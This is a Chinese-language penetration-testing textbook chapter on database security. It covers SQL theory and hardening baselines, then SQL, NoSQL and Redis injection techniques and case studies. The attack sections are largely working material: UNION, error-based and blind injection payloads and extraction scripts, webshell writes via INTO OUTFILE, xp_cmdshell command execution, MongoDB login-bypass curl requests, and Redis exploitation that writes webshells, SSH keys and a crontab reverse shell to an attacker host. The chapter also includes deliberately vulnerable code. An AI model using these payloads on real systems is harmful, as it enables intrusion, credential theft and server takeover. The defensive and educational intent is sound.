---
title: "第11章-数据库与数据结构"
type: docs
weight: 11
---

# 第11章 数据库与数据结构

## 章节概述

数据库是现代应用的核心组件，也是攻击者的重点目标。本章将系统讲解关系型数据库（MySQL、PostgreSQL）和NoSQL数据库（MongoDB、Redis）的安全攻防，同时介绍常见的数据结构在安全场景中的应用。掌握数据库安全是Web安全的基础，也是渗透测试的必备技能。

## 学习目标

通过本章学习，读者将能够：

1. **理解SQL注入原理**：掌握SQL注入的分类、利用方法和防御策略
2. **掌握数据库提权技术**：从Web应用权限提升到操作系统权限
3. **理解NoSQL注入**：掌握MongoDB、Redis等NoSQL数据库的攻击方法
4. **了解数据库安全加固**：配置安全的数据库环境
5. **掌握数据结构安全应用**：理解哈希表、树、图等数据结构在安全中的应用

## 内容结构

### 第一部分：理论基础（01-理论基础.md）
深入讲解关系型和非关系型数据库的核心概念、SQL语言基础、数据库架构和安全模型。

### 第二部分：核心技巧（02-核心技巧.md）
介绍SQL注入的各种技术，包括联合查询注入、盲注、时间盲注、堆叠注入等，以及NoSQL注入技术。

### 第三部分：实战案例（03-实战案例.md）
通过真实场景演示SQL注入攻击的完整流程，从发现漏洞到获取数据和权限。

### 第四部分：常见误区（04-常见误区.md）
分析数据库安全开发和渗透测试中的常见错误认知。

### 第五部分：练习方法（05-练习方法.md）
提供系统化的学习路径和实践建议。

### 第六部分：本章小结（06-本章小结.md）
总结本章核心知识点，回顾关键概念和技术要点。

## 前置知识

学习本章前，建议读者具备以下基础知识：

- Web开发基础（HTML、HTTP协议）
- 至少一门编程语言基础（Python或JavaScript）
- Linux命令行基础
- 计算机网络基础

## 学习时间建议

- 数据库基础与SQL：10-15小时
- SQL注入技术：20-30小时
- NoSQL注入：10-15小时
- 数据结构安全应用：10-15小时
- 总计建议：50-75小时（约3-4周全日制学习）

## 核心重点

1. **SQL注入是Web安全中最常见的漏洞之一**，必须熟练掌握
2. **参数化查询是防御SQL注入的根本方法**
3. **NoSQL注入同样危险**，不可忽视
4. **数据库提权是渗透测试的关键步骤**
5. **数据结构知识有助于理解安全工具的实现原理**

## 数据库类型速查

| 数据库类型 | 代表产品 | 典型应用场景 | 安全关注点 |
|-----------|---------|-------------|-----------|
| 关系型 | MySQL, PostgreSQL, MSSQL | Web应用、企业系统 | SQL注入、权限配置 |
| 文档型 | MongoDB | 大数据、日志存储 | NoSQL注入、未授权访问 |
| 键值型 | Redis, Memcached | 缓存、会话存储 | 未授权访问、命令注入 |
| 图数据库 | Neo4j | 社交网络、推荐系统 | Cypher注入 |
| 时序数据库 | InfluxDB | IoT、监控数据 | 认证绕过 |

***

***
# 第11章 理论基础——数据库与数据结构安全

## 1. 关系型数据库基础

### 1.1 SQL语言核心概念

```sql
-- SQL（Structured Query Language）是关系型数据库的标准语言
-- 主要分为：DDL（数据定义）、DML（数据操作）、DCL（数据控制）

-- DDL：创建和修改表结构
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    username VARCHAR(50) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    email VARCHAR(100),
    role ENUM('user', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- DML：数据操作
INSERT INTO users (username, password_hash, email) VALUES ('admin', 'hash...', 'admin@example.com');
SELECT * FROM users WHERE username = 'admin';
UPDATE users SET role = 'admin' WHERE id = 1;
DELETE FROM users WHERE id = 1;

-- DCL：权限控制
GRANT SELECT, INSERT ON mydb.users TO 'webapp'@'localhost';
REVOKE ALL PRIVILEGES ON mydb.* FROM 'untrusted'@'%';
```

### 1.2 MySQL架构与安全模型

```text
MySQL安全层次：

1. 网络层安全
   ├── 绑定地址（bind-address）
   ├── 防火墙规则
   └── SSL/TLS加密连接

2. 认证层安全
   ├── 用户名+密码认证
   ├── 认证插件（mysql_native_password, caching_sha2_password）
   └── 连接限制（max_connections, max_user_connections）

3. 授权层安全
   ├── 全局权限（*.*）
   ├── 数据库权限（db.*）
   ├── 表权限（db.table）
   ├── 列权限（db.table.column）
   └── 存储过程权限

4. 审计层安全
   ├── 通用查询日志（general_log）
   ├── 慢查询日志（slow_query_log）
   └── 二进制日志（binlog）
```

### 1.3 PostgreSQL安全特性

```sql
-- PostgreSQL的安全特性
-- 1. 行级安全策略（Row Level Security）
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

CREATE POLICY user_documents ON documents
    FOR ALL
    USING (owner = current_user);

-- 2. 角色和权限分离
CREATE ROLE readonly;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly;

CREATE ROLE app_user;
GRANT readonly TO app_user;
GRANT INSERT, UPDATE ON users, orders TO app_user;

-- 3. pg_hba.conf 认证配置
-- TYPE  DATABASE  USER      ADDRESS     METHOD
-- host  all       all       127.0.0.1/32  scram-sha-256
-- host  all       all       0.0.0.0/0     reject
```

***
## 2. NoSQL数据库基础

### 2.1 MongoDB架构

```javascript
// MongoDB是文档型数据库，使用BSON（Binary JSON）格式

// 创建集合和文档
db.users.insertOne({
    username: "admin",
    password: "hashed_password",
    email: "admin@example.com",
    roles: ["admin", "user"],
    profile: {
        name: "Administrator",
        age: 30
    }
});

// 查询操作
db.users.find({ username: "admin" });
db.users.find({ roles: { $in: ["admin"] } });
db.users.find({ "profile.age": { $gte: 18 } });

// MongoDB安全配置
// 1. 启用认证
// mongod --auth

// 2. 创建管理员用户
db.createUser({
    user: "admin",
    pwd: "secure_password",
    roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
});

// 3. 绑定IP
// mongod --bind_ip 127.0.0.1

// 4. 启用TLS
// mongod --tlsMode requireTLS --tlsCertificateKeyFile /path/to/cert.pem
```

### 2.2 Redis安全模型

```bash
# Redis是内存键值数据库，默认无认证

# 1. 设置密码
redis-cli
CONFIG SET requirepass "strong_password"

# 2. 绑定地址
# redis.conf: bind 127.0.0.1

# 3. 禁用危险命令
# redis.conf:
rename-command FLUSHDB ""
rename-command FLUSHALL ""
rename-command CONFIG "CONFIG_b92a9e7c"
rename-command DEBUG ""
rename-command SHUTDOWN ""

# 4. 常用Redis数据类型
SET mykey "value"           # 字符串
HSET user:1 name "admin"   # 哈希
LPUSH mylist "item1"        # 列表
SADD myset "member1"        # 集合
ZADD myzset 1 "member1"     # 有序集合
```

***
## 3. 数据结构基础

### 3.1 哈希表在安全中的应用

```text
哈希表（Hash Table）：
- O(1)平均时间复杂度的查找
- 用于实现：字典攻击防护、会话存储、缓存

安全应用：
1. 密码存储：使用哈希表存储密码哈希，快速验证
2. 会话管理：Session ID → 用户数据的映射
3. 速率限制：IP地址 → 请求计数的映射
4. 布隆过滤器：基于哈希的概率数据结构，用于检测恶意URL

哈希碰撞攻击：
- 如果哈希函数设计不当，攻击者可以构造大量碰撞
- 导致哈希表退化为链表，O(1) → O(n)
- PHP HashDoS漏洞（CVE-2011-4885）就是典型案例
```

### 3.2 树结构在安全中的应用

```text
树（Tree）结构：

1. 二叉搜索树（BST）
   - 用于实现高效的查找和排序
   - 安全应用：IP地理位置查找

2. 前缀树（Trie）
   - 用于字符串匹配和自动补全
   - 安全应用：恶意域名检测、敏感词过滤

3. Merkle树
   - 用于数据完整性验证
   - 安全应用：Git版本控制、区块链、证书透明度

4. B树/B+树
   - 数据库索引的核心数据结构
   - 理解B树有助于理解数据库性能和注入的影响
```

### 3.3 图结构在安全中的应用

```text
图（Graph）结构：

1. 网络拓扑图
   - 节点：主机、路由器、交换机
   - 边：网络连接
   - 应用：攻击路径分析、网络渗透规划

2. 权限关系图
   - 节点：用户、角色、资源
   - 边：权限关系
   - 应用：权限提升分析、最小权限审计

3. 控制流图（CFG）
   - 节点：基本块
   - 边：跳转关系
   - 应用：逆向工程、漏洞分析、代码审计

4. 调用图（Call Graph）
   - 节点：函数
   - 边：调用关系
   - 应用：污点分析、数据流追踪
```

***
## 4. SQL注入原理

### 4.1 SQL注入的本质

```sql
SQL注入的本质：用户输入被当作SQL代码执行

正常查询：
SELECT * FROM users WHERE username = 'admin' AND password = '123456'

注入后：
SELECT * FROM users WHERE username = 'admin'--' AND password = '任意值'
-- '--'是SQL注释符，后面的内容被忽略

注入条件：
1. 用户输入被直接拼接到SQL语句中
2. 拼接后的SQL语句被发送到数据库执行
3. 执行结果返回给用户（或影响数据库状态）
```

### 4.2 SQL注入分类

```text
按注入位置分类：
├── GET参数注入：URL查询参数
├── POST参数注入：表单数据
├── Cookie注入：Cookie值
├── HTTP头注入：User-Agent、Referer等
└── 二阶注入：存储后在其他查询中触发

按数据获取方式分类：
├── 联合查询注入（UNION）：直接看到查询结果
├── 报错注入：通过错误信息获取数据
├── 布尔盲注：通过页面差异判断
├── 时间盲注：通过响应时间判断
└── 堆叠注入：执行多条SQL语句

按数据库类型分类：
├── MySQL注入
├── PostgreSQL注入
├── MSSQL注入
├── Oracle注入
└── SQLite注入
```

***
## 5. 数据库安全配置基线

### 5.1 MySQL安全配置

```sql
-- 1. 删除匿名用户
DELETE FROM mysql.user WHERE User='';
FLUSH PRIVILEGES;

-- 2. 禁止远程root登录
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');
FLUSH PRIVILEGES;

-- 3. 删除测试数据库
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';

-- 4. 设置强密码策略
SET GLOBAL validate_password.length = 12;
SET GLOBAL validate_password.mixed_case_count = 1;
SET GLOBAL validate_password.number_count = 1;
SET GLOBAL validate_password.special_char_count = 1;

-- 5. 启用审计日志
-- my.cnf:
-- [mysqld]
-- general_log = 1
-- general_log_file = /var/log/mysql/general.log

-- 6. 限制文件操作
-- secure_file_priv = /var/lib/mysql-files/
```

### 5.2 MongoDB安全配置

```javascript
// 1. 启用访问控制
// mongod --auth

// 2. 创建应用专用用户
use myapp
db.createUser({
    user: "app_user",
    pwd: "strong_password",
    roles: [
        { role: "readWrite", db: "myapp" }
    ]
});

// 3. 启用TLS
// mongod --tlsMode requireTLS --tlsCertificateKeyFile /etc/ssl/mongodb.pem

// 4. 限制网络访问
// mongod --bind_ip 127.0.0.1,192.168.1.100

// 5. 启用审计
// mongod --auditDestination file --auditFormat JSON --auditPath /var/log/mongodb/audit.json
```

***
## 总结

本节介绍了数据库和数据结构的理论基础：

1. **关系型数据库**：SQL语言、MySQL/PostgreSQL架构和安全模型
2. **NoSQL数据库**：MongoDB文档模型、Redis键值模型
3. **数据结构**：哈希表、树、图在安全中的应用
4. **SQL注入原理**：注入的本质、分类和条件
5. **安全配置基线**：MySQL和MongoDB的安全加固

这些基础知识是后续学习SQL注入利用和防御的前提。

***

***
# 第11章 核心技巧——数据库注入与利用技术

## 1. SQL注入基础

### 1.1 手动SQL注入流程

```bash
# Step 1: 判断注入点
# 数字型注入
http://target/page?id=1'       # 报错
http://target/page?id=1 and 1=1  # 正常
http://target/page?id=1 and 1=2  # 异常

# 字符型注入
http://target/page?id=1'       # 报错
http://target/page?id=1' and '1'='1  # 正常
http://target/page?id=1' and '1'='2  # 异常

# Step 2: 判断列数（ORDER BY）
http://target/page?id=1' order by 1--   # 正常
http://target/page?id=1' order by 10--  # 报错
http://target/page?id=1' order by 5--   # 正常
http://target/page?id=1' order by 6--   # 报错 → 5列

# Step 3: 联合查询注入
http://target/page?id=-1' union select 1,2,3,4,5--
# 观察页面显示的数字位置

# Step 4: 获取数据库信息
http://target/page?id=-1' union select 1,database(),version(),4,5--
```

### 1.2 MySQL注入核心Payload

```sql
-- 获取所有数据库名
' UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5 FROM information_schema.schemata--

-- 获取当前数据库的表名
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--

-- 获取指定表的列名
' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='users'--

-- 获取数据
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3,4,5 FROM users--

-- 获取MySQL用户密码哈希
' UNION SELECT 1,GROUP_CONCAT(user,0x3a,authentication_string),3,4,5 FROM mysql.user--

-- 读取文件
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5--

-- 写入文件（需要FILE权限）
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4,5 INTO OUTFILE '/var/www/html/shell.php'--
```

***
## 2. 报错注入

### 2.1 常用报错函数

```sql
-- 1. extractvalue() 报错注入
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--

-- 2. updatexml() 报错注入
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e),1)--

-- 3. floor() 报错注入
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- 4. exp() 报错注入（MySQL 5.5及以下）
' AND exp(~(SELECT * FROM (SELECT database())a))--
```

### 2.2 报错注入长度限制绕过

```sql
-- extractvalue和updatexml报错结果最大32字符
-- 使用substr分段获取

-- 获取数据库名的前32个字符
' AND extractvalue(1,concat(0x7e,substr((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),1,32),0x7e))--

-- 获取第33个字符开始的内容
' AND extractvalue(1,concat(0x7e,substr((SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),33,32),0x7e))--

-- 或使用limit逐条获取
' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x7e))--
```

***
## 3. 盲注技术

### 3.1 布尔盲注

```python
import requests
import string

def boolean_blind_inject(url, payload_template):
    """布尔盲注：通过页面响应差异判断"""
    result = ""
    
    for i in range(1, 100):
        for char in string.printable:
            if char in ('%', '_'):  # 跳过SQL通配符
                continue
            
            payload = payload_template.format(i=i, char=char)
            target = f"{url}?id={payload}"
            
            response = requests.get(target)
            
            # 根据页面特征判断
            if "正常内容" in response.text:
                result += char
                print(f"[+] Found: {result}")
                break
        else:
            break  # 没有找到字符，说明已经读完
    
    return result

# 获取数据库名长度
length_payload = "-1' OR LENGTH(database())={i}--"
# 获取数据库名
name_payload = "-1' OR SUBSTR(database(),{i},1)='{char}'--"
# 获取表名
table_payload = "-1' OR SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),{i},1)='{char}'--"
```

### 3.2 时间盲注

```python
import requests
import time

def time_blind_inject(url, payload_template, delay=2):
    """时间盲注：通过响应时间判断"""
    result = ""
    
    for i in range(1, 100):
        for char_idx in range(32, 127):
            char = chr(char_idx)
            payload = payload_template.format(i=i, char=char)
            target = f"{url}?id={payload}"
            
            start = time.time()
            response = requests.get(target)
            elapsed = time.time() - start
            
            if elapsed >= delay:
                result += char
                print(f"[+] Found: {result}")
                break
        else:
            break
    
    return result

# MySQL时间盲注Payload
# IF(条件, SLEEP(2), 0)
time_payload = "-1' OR IF(ASCII(SUBSTR(database(),{i},1))={char},SLEEP(2),0)--"

# PostgreSQL时间盲注
# CASE WHEN 条件 THEN pg_sleep(2) ELSE pg_sleep(0) END
pg_time_payload = "-1'; SELECT CASE WHEN ASCII(SUBSTR(current_database(),{i},1))={char} THEN pg_sleep(2) ELSE pg_sleep(0) END--"
```

### 3.3 使用sqlmap自动化

```bash
# 基本用法
sqlmap -u "http://target/page?id=1" --batch

# 指定注入技术
sqlmap -u "http://target/page?id=1" --technique=BEUST

# 枚举数据库
sqlmap -u "http://target/page?id=1" --dbs

# 枚举表
sqlmap -u "http://target/page?id=1" -D mydb --tables

# 枚举数据
sqlmap -u "http://target/page?id=1" -D mydb -T users --dump

# 读取文件
sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd"

# 写入文件（Webshell）
sqlmap -u "http://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# POST请求注入
sqlmap -u "http://target/login" --data="username=admin&password=123" -p username

# Cookie注入
sqlmap -u "http://target/page" --cookie="session=abc123" -p session

# 绕过WAF
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between
```

***
## 4. 堆叠注入

### 4.1 MySQL堆叠注入

```sql
-- 堆叠注入：执行多条SQL语句
-- 前提：mysqli_multi_query() 或 PDO::ATTR_EMULATE_PREPARES = false

-- 修改管理员密码
'; UPDATE users SET password='new_hash' WHERE username='admin'--

-- 创建新管理员
'; INSERT INTO users (username, password, role) VALUES ('hacker', 'hash', 'admin')--

-- 导出数据到文件
'; SELECT * FROM users INTO OUTFILE '/tmp/users_backup.csv'--

-- MySQL 5.0+ 预编译语句
'; SET @sql = CONCAT('SELECT * FROM users INTO OUTFILE "/tmp/', NOW(), '.csv"'); PREPARE stmt FROM @sql; EXECUTE stmt--
```

### 4.2 MSSQL堆叠注入

```sql
-- MSSQL支持堆叠注入，且可以执行系统命令

-- 执行系统命令（需要xp_cmdshell权限）
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'--

-- 启用xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- 反弹Shell
'; EXEC xp_cmdshell 'powershell -e <base64_encoded_reverse_shell>'--
```

***
## 5. NoSQL注入

### 5.1 MongoDB注入

```javascript
// MongoDB注入通常发生在Node.js应用中

// 1. 认证绕过
// 漏洞代码：
db.users.find({ username: req.body.username, password: req.body.password });

// 攻击Payload（JSON格式）：
{
    "username": "admin",
    "password": { "$ne": "" }  // $ne: 不等于，匹配任何非空密码
}

// 2. 使用 $gt 操作符
{
    "username": "admin",
    "password": { "$gt": "" }  // 大于空字符串
}

// 3. 正则表达式注入
{
    "username": { "$regex": ".*" },
    "password": { "$regex": ".*" }
}

// 4. $where 注入
db.users.find({ $where: "this.username == 'admin' && this.password == 'xxx'" });
// 攻击：
db.users.find({ $where: "this.username == 'admin' || '1'=='1'" });

// 防御方法
// 使用Mongoose等ODM，自动处理类型检查
const UserSchema = new mongoose.Schema({
    username: { type: String, required: true },
    password: { type: String, required: true }
});

// 永远不要直接将用户输入传递给查询操作符
```

### 5.2 Redis未授权访问利用

```bash
# Redis默认无密码，如果暴露在公网上...

# 1. 检测未授权访问
redis-cli -h target_ip
> INFO
> CONFIG GET *

# 2. 写入Webshell
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET x "<?php system($_GET['cmd']); ?>"
> SAVE

# 3. 写入SSH公钥
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET x "\n\nssh-rsa AAAAB3... attacker@evil\n\n"
> SAVE

# 4. 写入Crontab反弹Shell
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE

# 5. 主从复制RCE（Redis 4.x/5.x）
# 使用 redis-rogue-server 工具
python3 redis-rogue-server.py --rhost target_ip --lhost attacker_ip
```

***
## 6. 二次注入

### 6.1 二次注入原理

```python
# 二次注入：数据先存储，后在不安全的查询中使用

# Step 1: 注册用户，用户名包含SQL注入payload
# 用户名: admin'--
# 密码: 123456
# 注册时使用参数化查询，安全存储

# Step 2: 修改密码功能
# 应用代码（不安全）：
def change_password(username, new_password):
    # 从数据库查询用户（使用了存储的恶意用户名）
    query = f"UPDATE users SET password='{hash(new_password)}' WHERE username='{username}'"
    db.execute(query)

# 实际执行的SQL：
# UPDATE users SET password='new_hash' WHERE username='admin'--'
# 这会修改admin的密码，而不是 admin'-- 用户的密码！
```

***
## 7. SQL注入防御

### 7.1 参数化查询

```python
# Python - 使用参数化查询
import mysql.connector

# ❌ 错误：字符串拼接
def unsafe_query(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)

# ✅ 正确：参数化查询
def safe_query(username):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))

# ✅ 正确：使用ORM
from sqlalchemy import create_engine, text

engine = create_engine("mysql://user:pass@localhost/db")
with engine.connect() as conn:
    result = conn.execute(
        text("SELECT * FROM users WHERE username = :username"),
        {"username": username}
    )
```

```javascript
// Node.js - 使用参数化查询
const mysql = require('mysql2');

// ❌ 错误
const unsafeQuery = `SELECT * FROM users WHERE username = '${username}'`;

// ✅ 正确：使用占位符
const safeQuery = 'SELECT * FROM users WHERE username = ?';
connection.execute(safeQuery, [username], (err, results) => {
    // ...
});
```

### 7.2 输入验证

```python
# 输入验证作为额外的防御层
import re

def validate_input(value, input_type):
    """输入验证（白名单）"""
    validators = {
        'integer': lambda v: v.isdigit(),
        'alpha': lambda v: bool(re.match(r'^[a-zA-Z]+$', v)),
        'alphanumeric': lambda v: bool(re.match(r'^[a-zA-Z0-9]+$', v)),
        'email': lambda v: bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', v)),
    }
    
    validator = validators.get(input_type)
    if not validator or not validator(value):
        raise ValueError(f"Invalid input: {value}")
    
    return value
```

***
## 总结

本节介绍了数据库注入的核心技术：

1. **SQL注入基础**：手动注入流程、MySQL核心Payload
2. **报错注入**：extractvalue、updatexml、floor报错
3. **盲注技术**：布尔盲注、时间盲注、sqlmap使用
4. **堆叠注入**：MySQL、MSSQL多语句执行
5. **NoSQL注入**：MongoDB注入、Redis未授权利用
6. **二次注入**：存储后在不安全查询中触发
7. **防御方法**：参数化查询、输入验证

这些技术是Web安全渗透测试的核心，需要大量实践才能熟练掌握。

***

***
# 第11章 实战案例——数据库安全攻防

## 案例一：联合查询注入获取管理员密码

### 目标场景

一个新闻发布系统，存在SQL注入漏洞。

### 漏洞代码

```php
// news.php
<?php
$id = $_GET['id'];
$conn = mysqli_connect("localhost", "root", "", "news_db");

// 漏洞：直接拼接用户输入
$query = "SELECT * FROM articles WHERE id = '$id'";
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_assoc($result);

echo "<h1>" . $row['title'] . "</h1>";
echo "<p>" . $row['content'] . "</p>";
?>
```

### 攻击步骤

```bash
# Step 1: 确认注入点
http://target/news.php?id=1' and '1'='1  # 正常显示
http://target/news.php?id=1' and '1'='2  # 无内容

# Step 2: 判断列数
http://target/news.php?id=1' order by 3--   # 正常
http://target/news.php?id=1' order by 4--   # 报错 → 3列

# Step 3: 找到显示位
http://target/news.php?id=-1' union select 1,2,3--
# 页面显示 2, 3 位置可用

# Step 4: 获取数据库信息
http://target/news.php?id=-1' union select 1,database(),version()--
# 数据库名: news_db，版本: 5.7.34

# Step 5: 获取表名
http://target/news.php?id=-1' union select 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='news_db'--
# 表名: articles,admin_users,comments

# Step 6: 获取admin_users表结构
http://target/news.php?id=-1' union select 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='admin_users'--
# 列名: id,username,password,email

# Step 7: 获取管理员密码
http://target/news.php?id=-1' union select 1,GROUP_CONCAT(username,0x3a,password),3 FROM admin_users--
# admin:e10adc3949ba59abbe56e057f20f883e (MD5: 123456)
```

***
## 案例二：时间盲注提取数据库

### 目标场景

一个API接口，页面不回显数据，但存在SQL注入。

### 漏洞代码

```python
# api.py
from flask import Flask, request, jsonify
import pymysql

app = Flask(__name__)

@app.route('/api/check')
def check_user():
    username = request.args.get('username')
    conn = pymysql.connect(host='localhost', user='root', password='', db='users_db')
    cursor = conn.cursor()
    
    # 漏洞：字符串拼接
    query = f"SELECT COUNT(*) FROM users WHERE username = '{username}'"
    cursor.execute(query)
    count = cursor.fetchone()[0]
    
    if count > 0:
        return jsonify({"exists": True})
    return jsonify({"exists": False})
```

### 攻击脚本

```python
import requests
import time
import string

def time_blind_extract(url):
    """时间盲注提取数据库名"""
    db_name = ""
    
    for i in range(1, 20):
        for char in string.ascii_lowercase + string.digits + '_':
            # 构造时间盲注payload
            payload = f"-1' OR IF(SUBSTR(database(),{i},1)='{char}',SLEEP(3),0)--"
            
            target = f"{url}?username={payload}"
            
            start = time.time()
            try:
                requests.get(target, timeout=10)
            except:
                pass
            elapsed = time.time() - start
            
            if elapsed >= 3:
                db_name += char
                print(f"[+] 数据库名: {db_name}")
                break
        else:
            break
    
    return db_name

def time_blind_extract_tables(url, db_name):
    """时间盲注提取表名"""
    tables = ""
    
    for i in range(1, 200):
        for char in string.ascii_lowercase + string.digits + '_',:
            payload = f"-1' OR IF(SUBSTR((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='{db_name}'),{i},1)='{char}',SLEEP(3),0)--"
            
            target = f"{url}?username={payload}"
            
            start = time.time()
            try:
                requests.get(target, timeout=10)
            except:
                pass
            elapsed = time.time() - start
            
            if elapsed >= 3:
                tables += char
                print(f"[+] 表名: {tables}")
                break
        else:
            break
    
    return tables

if __name__ == "__main__":
    url = "http://target/api/check"
    
    print("[*] 提取数据库名...")
    db_name = time_blind_extract(url)
    print(f"[+] 数据库名: {db_name}")
    
    print("[*] 提取表名...")
    tables = time_blind_extract_tables(url, db_name)
    print(f"[+] 表名: {tables}")
```

***
## 案例三：MongoDB注入绕过认证

### 目标场景

一个Node.js应用使用MongoDB存储用户数据。

### 漏洞代码

```javascript
// app.js
const express = require('express');
const mongoose = require('mongoose');
const app = express();

app.use(express.json());

mongoose.connect('mongodb://localhost:27017/myapp');

const UserSchema = new mongoose.Schema({
    username: String,
    password: String,
    role: { type: String, default: 'user' }
});

const User = mongoose.model('User', UserSchema);

// 漏洞：直接使用用户输入构造查询条件
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // 漏洞代码！
    const user = await User.findOne({ 
        username: username, 
        password: password 
    });
    
    if (user) {
        res.json({ success: true, role: user.role });
    } else {
        res.json({ success: false });
    }
});
```

### 攻击步骤

```bash
# Step 1: 正常登录尝试
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"123456"}'
# 返回: {"success":false}

# Step 2: 使用$ne操作符绕过
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
# 返回: {"success":true,"role":"admin"}

# Step 3: 使用$gt操作符
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$gt":""}}'
# 返回: {"success":true,"role":"admin"}

# Step 4: 使用$regex操作符
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"},"password":{"$regex":".*"}}'
# 返回第一个用户的信息
```

### 修复方案

```javascript
// 使用Mongoose的类型验证
const UserSchema = new mongoose.Schema({
    username: { type: String, required: true, match: /^[a-zA-Z0-9_]+$/ },
    password: { type: String, required: true }
});

// 安全的登录函数
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    
    // 验证输入类型
    if (typeof username !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input' });
    }
    
    // 使用bcrypt比较密码
    const user = await User.findOne({ username });
    if (user && await bcrypt.compare(password, user.password)) {
        res.json({ success: true, role: user.role });
    } else {
        res.json({ success: false });
    }
});
```

***
## 案例四：Redis未授权访问拿下服务器

### 目标场景

目标服务器运行Redis，无密码保护，端口6379对外开放。

### 攻击步骤

```bash
# Step 1: 确认Redis未授权访问
redis-cli -h target_ip
> INFO
# 如果返回服务器信息，说明存在未授权访问

# Step 2: 写入Webshell
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET x "<?php system($_GET['cmd']); ?>"
> SAVE
> OK

# Step 3: 访问Webshell
curl "http://target_ip/shell.php?cmd=whoami"
# www-data

# Step 4: 写入SSH公钥
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET x "\n\nssh-rsa AAAAB3Nza... attacker@kali\n\n"
> SAVE
> OK

# Step 5: SSH连接
ssh -i id_rsa root@target_ip

# Step 6: 写入Crontab（如果SSH不可用）
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1\n\n"
> SAVE

# 监听反弹Shell
nc -lvp 4444
```

***
## 案例五：二次注入修改管理员密码

### 目标场景

一个用户管理系统，使用参数化查询存储用户，但修改密码功能存在二次注入。

### 漏洞代码

```python
# user_manager.py
import hashlib
import pymysql

class UserManager:
    def __init__(self):
        self.conn = pymysql.connect(host='localhost', user='root', password='', db='user_db')
    
    def register(self, username, password):
        """注册用户 - 安全（参数化查询）"""
        cursor = self.conn.cursor()
        query = "INSERT INTO users (username, password) VALUES (%s, %s)"
        cursor.execute(query, (username, hashlib.md5(password.encode()).hexdigest()))
        self.conn.commit()
    
    def change_password(self, username, new_password):
        """修改密码 - 漏洞！"""
        cursor = self.conn.cursor()
        # 从数据库获取用户名（可能包含恶意payload）
        cursor.execute("SELECT username FROM users WHERE username = %s", (username,))
        stored_username = cursor.fetchone()[0]
        
        # 漏洞：使用字符串拼接！
        query = f"UPDATE users SET password = '{hashlib.md5(new_password.encode()).hexdigest()}' WHERE username = '{stored_username}'"
        cursor.execute(query)
        self.conn.commit()
```

### 攻击步骤

```python
# Step 1: 注册恶意用户
manager = UserManager()
# 用户名包含SQL注入payload
manager.register("admin'--", "any_password")
# 数据库中存储了: username = "admin'--"

# Step 2: 登录恶意用户
# 使用 admin'-- 和 any_password 登录成功

# Step 3: 修改密码
manager.change_password("admin'--", "hacked_password")
# 执行的SQL:
# UPDATE users SET password = 'hacked_hash' WHERE username = 'admin'--'
# 这实际上修改了admin的密码！

